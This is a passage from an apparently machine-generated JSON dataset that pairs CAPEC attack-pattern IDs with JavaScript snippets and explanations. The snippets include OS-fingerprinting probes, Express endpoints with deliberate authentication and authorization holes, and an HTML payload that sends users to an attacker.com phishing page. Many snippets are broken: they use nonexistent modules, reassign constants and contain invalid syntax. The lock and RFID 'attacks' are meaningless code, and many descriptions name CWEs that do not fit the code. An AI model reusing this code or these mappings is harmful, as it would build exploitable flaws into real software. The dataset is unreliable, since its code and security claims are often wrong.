        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nlet sequenceNumbers = [];\nlet socket = new net.Socket();\n\nsocket.connect(8080, 'localhost', () => {\n    for (let i = 0; i < 100; i++) {\n        socket.write('GET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n');\n        socket.on('data', (data) => {\n            let sequenceNumber = data.toString().match(/Seq=([0-9]+)/)[1];\n            sequenceNumbers.push(parseInt(sequenceNumber));\n        });\n    }\n});\n\nsetTimeout(() => {\n    let standardDeviation = calculateStandardDeviation(sequenceNumbers);\n    console.log(`Standard Deviation: ${standardDeviation}`);\n    // Compare standardDeviation to a database of operating system behaviors\n    // to determine a likely match for operating system and version.\n}, 5000);\n\nfunction calculateStandardDeviation(arr) {\n    let sum = arr.reduce((a, b) => a + b, 0);\n    let mean = sum / arr.length;\n    let variance = arr.map(x => Math.pow(x - mean, 2)).reduce((a, b) => a + b, 0) / arr.length;\n    return Math.sqrt(variance);\n}",
        "description": "This JavaScript code snippet demonstrates a CAPEC that attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. It uses the `net` and `crypto` modules to establish a connection to a server and send multiple requests to collect sequence numbers. The sequence numbers are then used to calculate the standard deviation, which can be compared to a database of operating system behaviors to determine a likely match for operating system and version. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-337 (Predictable Seed in Pseudo-Random Number Generator (PRNG)), CWE-341 (Predictable from Observable State), CWE-353 (Missing Support for Integrity Check), and CWE-211 (Externally-Generated Error Message Containing Sensitive Information)."
    },
    {
        "capec_id": "325",
        "code_snippet": "const net = require('net');\nconst socket = new net.Socket();\n\nsocket.connect(80, 'example.com', () => {\n  const ecnPacket = new Buffer('ECN packet', 'utf8');\n  socket.write(ecnPacket);\n});\n\nsocket.on('data', (data) => {\n  console.log('Received response: ' + data);\n  // No integrity check or encryption is performed on the received data\n  // CWE-353: Missing Support for Integrity Check\n  // CWE-319: Cleartext Transmission of Sensitive Information\n});\n\nsocket.on('error', (error) => {\n  console.log('Error occurred: ' + error);\n  // No control is implemented to limit the volume of error messages\n  // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n});",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that checks if a remote host supports explicit congestion notification (ECN) messaging. It sends an ECN packet to the remote host and logs the received response without performing any integrity checks or encryption, exposing sensitive information to unauthorized actors. The code also lacks control over error message volume, allowing an actor to cause the product to transmit more traffic than allowed."
    },
    {
        "capec_id": "326",
        "code_snippet": "const net = require('net');\n\nlet initialWindowSize = 0;\n\nconst client = new net.Socket();\n\nclient.connect(8080, 'localhost', () => {\n  client.write('GET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  const tcpHeader = data.slice(0, 20);\n  const windowSize = tcpHeader.readUInt16BE(14);\n  initialWindowSize = windowSize;\n  console.log(`Initial Window Size: ${initialWindowSize}`);\n});\n\nclient.on('error', (err) => {\n  console.error(err);\n});",
        "description": "This JavaScript code snippet demonstrates an OS fingerprinting probe that checks the initial TCP Window size. It establishes a TCP connection to a server, sends an HTTP request, and then extracts the initial window size from the TCP header of the response. The initial window size can be used to identify the operating system of the server. This code is vulnerable to CWE-200: Exposure of Sensitive Information to an Unauthorized Actor, CWE-121: Stack-based Buffer Overflow, CWE-806: Buffer Access Using Size of Source Buffer, CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime, and CWE-188: Reliance on Data/Memory Layout."
    },
    {
        "capec_id": "327",
        "code_snippet": "const net = require('net');\nconst tcp = require('tcp');\n\nconst socket = new net.Socket();\nsocket.connect(80, 'example.com', () => {\n  const options = {\n    'Timestamps': true,\n    'Window Scale': true,\n    'SACK Permitted': true,\n    'NOP': true,\n    'MSS': 1460\n  };\n\n  const tcpOptions = [];\n  for (const option in options) {\n    if (options[option]) {\n      tcpOptions.push(tcp.Option[option]);\n    }\n  }\n\n  const packet = new Buffer(40);\n  packet.writeUInt8(0x54, 0); // SYN packet\n  packet.writeUInt8(0, 1); // No flags\n  packet.writeUInt16BE(12345, 2); // Source port\n  packet.writeUInt16BE(80, 4); // Destination port\n  packet.writeUInt32BE(0, 6); // Sequence number\n  packet.writeUInt32BE(0, 10); // Acknowledgment number\n  packet.writeUInt16BE(0x5012, 14); // Data offset and flags\n  packet.writeUInt16BE(1460, 16); // Window size\n  packet.writeUInt16BE(0, 18); // Checksum\n  packet.writeUInt16BE(0, 20); // Urgent pointer\n\n  // Add TCP options\n  let offset = 20;\n  for (const option of tcpOptions) {\n    packet.writeUInt8(option.kind, offset);\n    offset += 1;\n    packet.writeUInt8(option.length, offset);\n    offset += 1;\n    if (option.kind === tcp.Option.Timestamps) {\n      packet.writeUInt32BE(0, offset);\n      offset += 4;\n      packet.writeUInt32BE(0, offset);\n      offset += 4;\n    } else if (option.kind === tcp.Option.WindowScale) {\n      packet.writeUInt8(0, offset);\n      offset += 1;\n    } else if (option.kind === tcp.Option.SACKPermitted) {\n      packet.writeUInt8(0, offset);\n      offset += 1;\n    } else if (option.kind === tcp.Option.NOP) {\n      // No operation\n    } else if (option.kind === tcp.Option.MSS) {\n      packet.writeUInt16BE(1460, offset);\n      offset += 2;\n    }\n  }\n\n  // Send the packet\n  socket.write(packet);\n});",
        "description": "This code snippet demonstrates a TCP fingerprinting probe that analyzes the type and order of TCP header options present in a response segment. It creates a TCP packet with various options (Timestamps, Window Scale, SACK Permitted, NOP, and MSS) and sends it to a server. The server's response can be analyzed to determine the operating system and its TCP implementation, which can lead to exposure of sensitive information. This code relates to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-188 (Reliance on Data/Memory Layout), CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime), CWE-605 (Multiple Binds to the Same Port), and CWE-1316 (Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges)."
    },
    {
        "capec_id": "328",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nconst rstPacket = Buffer.from('RST packet', 'ascii');\nconst checksum = crypto.createHash('md5').update(rstPacket).digest('hex');\n\nconst client = new net.Socket();\nclient.connect(8080, 'localhost', () => {\n  client.write(rstPacket);\n});\n\nclient.on('data', (data) => {\n  if (data.toString().includes('human-readable text message')) {\n    console.log('OS fingerprinting successful!');\n    const receivedChecksum = crypto.createHash('md5').update(data).digest('hex');\n    if (receivedChecksum === checksum) {\n      console.log('Checksum matches!');\n    } else {\n      console.log('Checksum does not match!');\n    }\n  }\n});",
        "description": "This code snippet demonstrates an OS fingerprinting probe that sends a RST packet with a human-readable text message and calculates its MD5 checksum. It then connects to a server, sends the RST packet, and waits for the response. If the response contains a human-readable text message, it calculates the checksum of the received data and compares it with the original checksum. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-353 (Missing Support for Integrity Check), CWE-354 (Improper Validation of Integrity Check Value), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-294 (Authentication Bypass by Capture-replay) as it transmits sensitive information in cleartext, lacks integrity checks, and can be vulnerable to capture-replay attacks."
    },
    {
        "capec_id": "329",
        "code_snippet": "const net = require('net');\nconst icmp = require('icmp');\n\nconst targetIP = '192.168.1.100';\nconst targetPort = 80;\n\nconst socket = new net.Socket();\nsocket.connect(targetPort, targetIP, () => {\n  socket.write('GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n');\n});\n\nsocket.on('error', (error) => {\n  if (error.code === 'ECONNREFUSED') {\n    const icmpPacket = icmp.createICMP({\n      type: 'destination-unreachable',\n      code: 3,\n      checksum: 0x0000,\n      data: Buffer.from('Error: Connection refused', 'utf8')\n    });\n    console.log(icmpPacket);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable ICMP error message generation. It creates a socket connection to a target IP and port, sends an HTTP request, and then intentionally triggers an error by connecting to a closed port. When the error occurs, it generates an ICMP error message with sensitive information (in this case, the error message 'Error: Connection refused') and logs it to the console. This code embodies the CAPEC and CWEs by exposing sensitive information in the error message, which can be analyzed by an adversary to gain insights about the target system."
    },
    {
        "capec_id": "330",
        "code_snippet": "const net = require('net');\nconst icmp = require('icmp');\n\nconst socket = new net.Socket();\nsocket.connect(80, 'example.com', () => {\n  socket.write('GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n');\n});\n\nsocket.on('error', (error) => {\n  if (error.code === 'ECONNREFUSED') {\n    const icmpPacket = icmp.createICMP(icmp.TYPE_DEST_UNREACH, icmp.CODE_PORT_UNREACH);\n    icmpPacket.setSourceIP('192.168.1.100');\n    icmpPacket.setDestIP('8.8.8.8');\n    icmpPacket.setPayload(error.message);\n    icmp.sendICMP(icmpPacket);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable code that embodies the CAPEC idea of generating an ICMP error message and analyzing the integrity of data returned. It creates a socket connection to a target server, sends an HTTP request, and listens for an error event. When an error occurs (e.g., connection refused), it generates an ICMP Destination Unreachable packet with the error message as the payload and sends it to a target IP address. This code is vulnerable to CWE-200 (Exposure of Sensitive Information), CWE-211 (Externally-Generated Error Message Containing Sensitive Information), CWE-294 (Authentication Bypass by Capture-replay), CWE-353 (Missing Support for Integrity Check), and CWE-210 (Self-generated Error Message Containing Sensitive Information)."
    },
    {
        "capec_id": "331",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nsocket.bind(8080, () => {\n  console.log('UDP server listening on 8080');\n});\n\nsocket.on('error', (err) => {\n  console.log(`Error occurred: ${err}`);\n});\n\nsocket.on('message', (msg, info) => {\n  const response = `Error: Port ${info.port} is not available`;\n  socket.send(response, 0, response.length, info.port, info.address, (error) => {\n    if (error) {\n      console.log(`Error sending response: ${error}`);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable UDP server that responds to incoming requests with an error message containing the IP Header's total length field value when a packet is sent to a closed port. The server does not handle length parameter inconsistencies, does not support integrity checks, and transmits sensitive information in cleartext, making it vulnerable to the described CAPEC and CWEs."
    },
    {
        "capec_id": "332",
        "code_snippet": "const dgram = require('dgram');\nconst icmp = require('icmp');\n\nconst socket = dgram.createSocket('udp4');\n\nsocket.bind(8080, () => {\n  socket.setBroadcast(true);\n});\n\nsocket.on('message', (message, remoteInfo) => {\n  const icmpMessage = icmp.parse(message);\n  if (icmpMessage.type === 3 && icmpMessage.code === 3) {\n    // ICMP destination unreachable, port unreachable\n    console.log(`Received ICMP error from ${remoteInfo.address}:${remoteInfo.port}`);\n    console.log(`ID: ${icmpMessage.id}`);\n    console.log(`Sequence Number: ${icmpMessage.seq}`);\n    // Analyze the ICMP error message to fingerprint the OS\n  }\n});\n\n// Send UDP datagram to a closed port on the target\nsocket.send(Buffer.from('Hello'), 0, 5, 8081, '192.168.1.100', (error) => {\n  if (error) {\n    console.log(error);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of sending a UDP datagram to a closed port on a target to observe the manner in which the ID is echoed back in the ICMP error message, allowing an attacker to construct a fingerprint of specific OS behaviors. The code uses the 'dgram' and 'icmp' modules to create a UDP socket, bind it to a port, and send a UDP datagram to a closed port on the target. When the ICMP error message is received, the code analyzes it to extract the ID and sequence number, which can be used to fingerprint the OS. This code embodies CWE-204 (Observable Response Discrepancy), CWE-1192 (Improper Identifier for IP Block used in System-On-Chip (SOC)), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-211 (Externally-Generated Error Message Containing Sensitive Information), and CWE-1276 (Hardware Child Block Incorrectly Connected to Parent System)."
    },
    {
        "capec_id": "383",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/virtualSale', (req, res) => {\n  const userId = req.query.userId;\n  const username = req.query.username;\n  // No encryption or protection of sensitive data\n  console.log(`User ${username} with ID ${userId} has entered the virtual sale.`);\n  // Store user data in cleartext\n  const userData = {\n    userId,\n    username\n  };\n  // Transmit sensitive data in cleartext\n  res.json(userData);\n});\n\napp.post('/sendMessage', (req, res) => {\n  const userId = req.body.userId;\n  const message = req.body.message;\n  // Unprotected primary channel for sending messages\n  console.log(`Sending message to user ${userId}: ${message}`);\n  // Client-side enforcement of server-side security\n  res.json({ success: true });\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that hosts a virtual sale event. When a user enters the event, their user ID and username are transmitted in cleartext and stored without encryption. An adversary can intercept this data and use it to send spam messages to the users. The application also uses an unprotected primary channel for sending messages and relies on client-side enforcement of server-side security."
    },
    {
        "capec_id": "384",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/api/data', (req, res) => {\n  const data = req.body;\n  // CWE-311: Missing Encryption of Sensitive Data\n  const sensitiveData = data.sensitiveInfo;\n  // CWE-346: Origin Validation Error\n  const origin = req.headers.origin;\n  if (origin !== 'http://trusted-origin.com') {\n    res.status(403).send('Invalid origin');\n    return;\n  }\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  const clientValidation = req.body.validation;\n  if (!clientValidation) {\n    res.status(403).send('Invalid validation');\n    return;\n  }\n  // CWE-345: Insufficient Verification of Data Authenticity\n  const authenticityToken = req.body.authToken;\n  if (!authenticityToken || authenticityToken !== 'secretToken') {\n    res.status(403).send('Invalid authenticity token');\n    return;\n  }\n  // CWE-471: Modification of Assumed-Immutable Data (MAID)\n  const assumedImmutableData = req.body.immutableData;\n  if (assumedImmutableData !== 'expectedValue') {\n    res.status(403).send('Immutable data modified');\n    return;\n  }\n  // Process data\n  res.send('Data processed successfully');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that fails to properly validate and authenticate client-side data, allowing an attacker to manipulate the data and gain unauthorized privileges. The code uses Express.js and has multiple vulnerabilities, including missing encryption of sensitive data, origin validation errors, client-side enforcement of server-side security, insufficient verification of data authenticity, and modification of assumed-immutable data."
    },
    {
        "capec_id": "385",
        "code_snippet": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws) => {\n  ws.on('message', (message) => {\n    // CWE-471: Modification of Assumed-Immutable Data (MAID)\n    // CWE-345: Insufficient Verification of Data Authenticity\n    // CWE-346: Origin Validation Error\n    const modifiedMessage = modifyMessage(message);\n    ws.send(modifiedMessage);\n  });\n});\n\nfunction modifyMessage(message) {\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  // CWE-311: Missing Encryption of Sensitive Data\n  const encryptedData = encryptData(message);\n  return encryptedData;\n}\n\nfunction encryptData(data) {\n  // No encryption implemented, data is sent in plaintext\n  return data;\n}\n\nfunction modifyItem(item) {\n  // CWE-471: Modification of Assumed-Immutable Data (MAID)\n  item.value = item.value * 2; // Modify the item value\n  return item;\n}",
        "description": "This code snippet demonstrates a man-in-the-middle attack in a web application, where an attacker intercepts and modifies messages exchanged between the client and server. The attacker can modify the content of the messages, such as item values, and send them back to the client or server, potentially leading to fraudulent activities. The code uses WebSockets to establish a connection between the client and server, and the `modifyMessage` function to alter the message content. The `encryptData` function is intentionally left unimplemented, highlighting the CWE-311 vulnerability. The `modifyItem` function demonstrates the CWE-471 vulnerability by modifying an assumed-immutable item value."
    },
    {
        "capec_id": "386",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/messages', (req, res) => {\n  const userId = req.query.userId;\n  const message = {\n    'image': '<img src=\\'https://attacker.com/malicious_image\\' onclick=\\'window.location.href = \\'https://attacker.com/phishing_page\\';\\'/>',\n    'button': '<button onclick=\\'window.location.href = \\'https://attacker.com/phishing_page\\';\\'>Click me!</button>'\n  };\n  res.json(message);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable API endpoint that returns a JSON response containing an image and a button with malicious links. The links are not properly validated, allowing an attacker to manipulate the content and redirect users to a phishing page. This code embodies CWE-471 (Modification of Assumed-Immutable Data), CWE-345 (Insufficient Verification of Data Authenticity), CWE-346 (Origin Validation Error), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-311 (Missing Encryption of Sensitive Data)."
    },
    {
        "capec_id": "387",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\nlet isAdmin = false;\n\napp.post('/makeAdmin', (req, res) => {\n  isAdmin = req.body.isAdmin;\n  res.send('isAdmin set to ' + isAdmin);\n});\n\napp.get('/protectedRoute', (req, res) => {\n  if (isAdmin) {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js Express.js application that allows an adversary to manipulate the isAdmin flag by sending a POST request to the /makeAdmin endpoint. The application does not properly verify the authenticity of the data, relying on the client to set the isAdmin flag. This is an example of CWE-471 (Modification of Assumed-Immutable Data), CWE-345 (Insufficient Verification of Data Authenticity), CWE-346 (Origin Validation Error), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-311 (Missing Encryption of Sensitive Data). An attacker can exploit this vulnerability by sending a malicious request to become an admin, bypassing the expected application logic."
    },
    {
        "capec_id": "388",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/messages', (req, res) => {\n  const userId = req.query.userId;\n  const messageData = {\n    buttons: [\n      {\n        text: 'Click me!',\n        url: 'https://attacker-controlled-destination.com'\n      }\n    ]\n  };\n\n  // No verification of data authenticity or origin\n  if (userId) {\n    messageData.buttons[0].url = req.query.buttonUrl;\n  }\n\n  res.json(messageData);\n});",
        "description": "This code snippet demonstrates a vulnerable API endpoint that allows an attacker to manipulate the destination of buttons displayed to a user within API messages. The endpoint does not properly verify the origin or authenticity of the 'buttonUrl' parameter, allowing an attacker to modify the URL of the button. Additionally, the code relies on the client to implement security mechanisms, which can be easily bypassed. The sensitive data (button URL) is also not encrypted before transmission."
    },
    {
        "capec_id": "389",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\nconst authenticate = (req, res, next) => {\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  // CWE-603: Use of Client-Side Authentication\n  const token = req.body.token;\n  if (token === 'some_secret_token') {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n};\n\napp.post('/api/data', authenticate, (req, res) => {\n  // CWE-294: Authentication Bypass by Capture-replay\n  // CWE-290: Authentication Bypass by Spoofing\n  const data = req.body.data;\n  // No integrity check (CWE-353) or authentication on the server-side\n  res.send(`Received data: ${data}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable API endpoint that is susceptible to content spoofing attacks. The authentication mechanism relies on client-side checks, allowing an attacker to bypass authentication by modifying the client-side code or capturing and replaying the authentication token. The lack of server-side authentication and integrity checks enables the attacker to manipulate the data in transit, leading to potential security breaches."
    },
    {
        "capec_id": "390",
        "code_snippet": "const accessControl = {\n  lock: () => {\n    // CWE-1300: Improper Protection of Physical Side Channels\n    // Using a simple delay to simulate a physical lock, but this can be bypassed by monitoring power consumption patterns\n    setTimeout(() => {\n      console.log('Locked');\n    }, 5000);\n  },\n  \n  authenticate: (cardId) => {\n    // CWE-1263: Improper Physical Access Control\n    // Simple authentication mechanism that can be bypassed with physical access\n    if (cardId === 'authorized') {\n      return true;\n    } else {\n      return false;\n    }\n  },\n  \n  protectAgainstGlitches: () => {\n    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    // No protection against voltage and clock glitches, making it vulnerable to attacks\n    console.log('No protection against glitches');\n  },\n  \n  protectAgainstEMFI: () => {\n    // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n    // No protection against EMFI attacks, making it vulnerable to information compromise\n    console.log('No protection against EMFI');\n  },\n  \n  sendAlert: (signalCondition) => {\n    // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n    // Untrusted agents can disable alerts about signal conditions exceeding limits\n    if (signalCondition > 100) {\n      console.log('Alert: Signal condition exceeded limit');\n    }\n  }\n};",
        "description": "A vulnerable physical security system that can be bypassed by exploiting weaknesses in physical side channels, access control, glitch protection, EMFI protection, and alert signals."
    },
    {
        "capec_id": "391",
        "code_snippet": "const debugMode = true;\nconst lockBit = 0x01;\nconst registerLock = 0x02;\nconst addressRegion = 0x1000;\n\nif (debugMode) {\n  // CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\n  console.log('Debug mode enabled. Locks overridden.');\n  lockBit = 0x00;\n  registerLock = 0x00;\n}\n\n// CWE-412: Unrestricted Externally Accessible Lock\nconst externalLock = 0x04;\nif (externalLock === 0x04) {\n  console.log('External lock detected. Access granted.');\n  // CWE-1263: Improper Physical Access Control\n  const physicalAccess = true;\n  if (physicalAccess) {\n    console.log('Physical access granted. Locks bypassed.');\n    // CWE-1231: Improper Prevention of Lock Bit Modification\n    lockBit = 0x00;\n    // CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n    registerLock = 0x00;\n    addressRegion = 0x0000;\n  }\n}",
        "description": "This code snippet demonstrates the CAPEC of bypassing physical security measures by exploiting vulnerabilities in lock mechanisms. It includes CWE-1263, CWE-1231, CWE-1222, CWE-412, and CWE-1234, showcasing how an attacker can bypass locks and gain unauthorized access to facilities or devices."
    },
    {
        "capec_id": "392",
        "code_snippet": "const lock = {\n  pins: [1, 2, 3, 4, 5],\n  driverPins: [1, 2, 3, 4, 5],\n  lockBit: 0\n};\n\nfunction bumpKey(key) {\n  // CWE-1231: Improper Prevention of Lock Bit Modification\n  lock.lockBit = 0;\n  for (let i = 0; i < lock.pins.length; i++) {\n    if (key[i] === lock.pins[i]) {\n      lock.driverPins[i] = key[i];\n    }\n  }\n  // CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n  const writableRegions = [0, 1, 2];\n  for (let i = 0; i < writableRegions.length; i++) {\n    lock.driverPins[writableRegions[i]] = key[writableRegions[i]];\n  }\n  // CWE-1232: Improper Lock Behavior After Power State Transition\n  if (lock.lockBit === 0) {\n    lock.lockBit = 1;\n  }\n  // CWE-321: Use of Hard-coded Cryptographic Key\n  const hardcodedKey = [1, 2, 3, 4, 5];\n  for (let i = 0; i < hardcodedKey.length; i++) {\n    lock.driverPins[i] = hardcodedKey[i];\n  }\n  // CWE-645: Overly Restrictive Account Lockout Mechanism\n  const maxAttempts = 3;\n  let attempts = 0;\n  while (attempts < maxAttempts) {\n    if (lock.lockBit === 1) {\n      console.log('Account locked out!');\n      break;\n    }\n    attempts++;\n  }\n  return lock;\n}\n\nconst bumpKeyInstance = bumpKey([1, 2, 3, 4, 5]);",
        "description": "This JavaScript code snippet demonstrates the concept of lock bumping, where an attacker uses a specially constructed key to force a lock open. The code includes vulnerabilities related to CWE-1231, CWE-1222, CWE-1232, CWE-321, and CWE-645, which are all related to improper lock behavior and cryptographic key management."
    },
    {
        "capec_id": "393",
        "code_snippet": "const lock = {\n  isLocked: true,\n  lockBit: 0x01,\n  addressRegion: 0x1000\n};\n\nfunction setLockBit(lockBit) {\n  lock.lockBit = lockBit;\n}\n\nfunction lockResource() {\n  if (lock.isLocked) {\n    console.log('Resource is already locked.');\n  } else {\n    lock.isLocked = true;\n    setLockBit(0x01);\n  }\n}\n\nfunction unlockResource() {\n  if (!lock.isLocked) {\n    console.log('Resource is not locked.');\n  } else {\n    lock.isLocked = false;\n    setLockBit(0x00);\n  }\n}\n\n// CWE-1231: Improper Prevention of Lock Bit Modification\nsetLockBit(0x00);\n\n// CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\nlock.addressRegion = 0x2000;\n\n// CWE-412: Unrestricted Externally Accessible Lock\nlock.isLocked = false;\n\n// CWE-832: Unlock of a Resource that is not Locked\nunlockResource();\n\n// CWE-833: Deadlock\nfunction thread1() {\n  lockResource();\n  thread2();\n}\nfunction thread2() {\n  lockResource();\n  thread1();\n}\nthread1();",
        "description": "This code snippet demonstrates a lock mechanism that can be exploited using various lock picking techniques. The lock has a lock bit that can be modified externally, and the address region protected by the lock is not granular enough. The lock can be controlled externally, and the code attempts to unlock a resource that is not locked, leading to a deadlock."
    },
    {
        "capec_id": "394",
        "code_snippet": "const lock = {\n  pins: [],\n  driverPins: [],\n  lockBit: true,\n  cryptographicKey: 'defaultKey'\n};\n\nfunction snapGun() {\n  // CWE-833: Deadlock - multiple threads waiting for each other\n  const thread1 = () => {\n    while (lock.lockBit) {\n      // wait for lockBit to be released\n    }\n  };\n  const thread2 = () => {\n    while (!lock.lockBit) {\n      // wait for lockBit to be set\n    }\n  };\n  thread1();\n  thread2();\n\n  // CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n  const largeAddressRegion = {\n    address1: '0x0000',\n    address2: '0x0001',\n    ...,\n    addressN: '0x00FF'\n  };\n  Object.freeze(largeAddressRegion);\n\n  // CWE-1231: Improper Prevention of Lock Bit Modification\n  lock.lockBit = false;\n\n  // CWE-1394: Use of Default Cryptographic Key\n  const encryptedData = encrypt('sensitiveData', lock.cryptographicKey);\n\n  // CWE-1232: Improper Lock Behavior After Power State Transition\n  const powerStateTransition = () => {\n    // after power state transition, lockBit becomes programmable\n    lock.lockBit = true;\n  };\n  powerStateTransition();\n\n  // Snap Gun attack - forcing the lock into momentary alignment\n  lock.pins.forEach((pin) => {\n    pin.value = 'aligned';\n  });\n  lock.driverPins.forEach((driverPin) => {\n    driverPin.value = 'unlocked';\n  });\n}\n\nsnapGun();",
        "description": "This code snippet demonstrates a JavaScript implementation of the Snap Gun attack, which exploits the design of a lock to force it into momentary alignment. The code includes examples of related CWEs, such as deadlock, insufficient granularity of address regions protected by register locks, improper prevention of lock bit modification, use of default cryptographic key, and improper lock behavior after power state transition."
    },
    {
        "capec_id": "395",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst key = 'my_secret_key';\n\n// Broken cryptographic algorithm (CWE-327)\nconst cipher = crypto.createCipher('aes-128-cbc', key);\n\n// RFID tag data\nconst rfidData = '01010101';\n\n// Encrypt RFID data using broken algorithm\nconst encryptedRfidData = cipher.update(rfidData, 'utf8', 'hex');\n\n// Store encrypted data in a magnetic strip card\nconst magneticStripCard = {\n  data: encryptedRfidData\n};\n\n// Simulate electromagnetic fault injection (CWE-1319)\nconst emfiAttack = () => {\n  // Flip a random bit in the encrypted data\n  const flippedBit = Math.floor(Math.random() * encryptedRfidData.length);\n  encryptedRfidData[flippedBit] ^= 0x01;\n};\n\n// Simulate physical side channel attack (CWE-1300)\nconst physicalSideChannelAttack = () => {\n  // Monitor power consumption patterns to recover encrypted data\n  const powerConsumptionPattern = [...encryptedRfidData].map((byte) => {\n    return byte.toString(2).padStart(8, '0');\n  }).join('');\n  console.log(powerConsumptionPattern);\n};\n\n// Simulate IC imaging attack (CWE-1278)\nconst icImagingAttack = () => {\n  // Recover encrypted data from IC images\n  const recoveredData = [...encryptedRfidData].map((byte) => {\n    return byte.toString(16).padStart(2, '0');\n  }).join('');\n  console.log(recoveredData);\n};",
        "description": "This code snippet demonstrates a vulnerable JavaScript implementation of an RFID-based access control system. It uses a hard-coded cryptographic key, a broken cryptographic algorithm, and is susceptible to electromagnetic fault injection, physical side channel attacks, and IC imaging attacks. An attacker can exploit these weaknesses to bypass the access control system."
    },
    {
        "capec_id": "396",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-290: Authentication Bypass by Spoofing\nfunction authenticate(username, password) {\n  if (username === 'admin' && password === 'password') {\n    return true;\n  }\n  return false;\n}\n\n// CWE-294: Authentication Bypass by Capture-replay\nfunction captureReplayAuth(username, password) {\n  const capturedToken = 'captured_token';\n  if (capturedToken === 'valid_token') {\n    return true;\n  }\n  return false;\n}\n\n// CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('des', 'weak_key');\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// CWE-592 and CWE-217 are deprecated, but the concept can be demonstrated as follows:\nconst storedData = { username: 'user', password: 'password' };\n\nfunction modifyStoredData() {\n  storedData.username = 'attacker';\n  storedData.password = 'new_password';\n}\n",
        "description": "This code snippet demonstrates various authentication bypass and cryptographic weaknesses. The authenticate function has a hardcoded username and password, making it vulnerable to spoofing attacks (CWE-290). The captureReplayAuth function uses a captured token to authenticate, making it vulnerable to capture-replay attacks (CWE-294). The encryptData function uses a broken DES encryption algorithm with a weak key, making it vulnerable to cryptographic attacks (CWE-327). The storedData object is also vulnerable to modification, demonstrating the concept of CWE-217, although it is deprecated."
    },
    {
        "capec_id": "397",
        "code_snippet": "class SwipeCard { constructor(cardData) { this.cardData = cardData; } clone() { return Object.create(this); } getCardData() { return this.cardData; } } let originalCard = new SwipeCard({ /* sensitive data */ }); let clonedCard = originalCard.clone(); console.log(clonedCard.getCardData());",
        "description": "This code snippet demonstrates the vulnerability of magstripe cards to unauthorized duplication. The SwipeCard class contains sensitive data and is cloneable, allowing an attacker to easily create a duplicate of the original card. The cloned card can then be used to gain unauthorized access to a physical location or a person's private information."
    },
    {
        "capec_id": "398",
